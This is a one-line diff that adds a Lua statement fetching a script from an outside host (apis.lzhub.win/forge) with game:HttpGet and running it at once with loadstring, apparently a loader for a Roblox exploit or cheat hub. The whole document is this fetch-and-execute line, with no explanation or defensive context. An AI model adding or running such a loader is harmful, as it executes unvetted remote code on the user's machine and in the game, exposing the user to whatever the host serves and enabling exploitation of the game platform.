@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://apis.lzhub.win/forge"))()
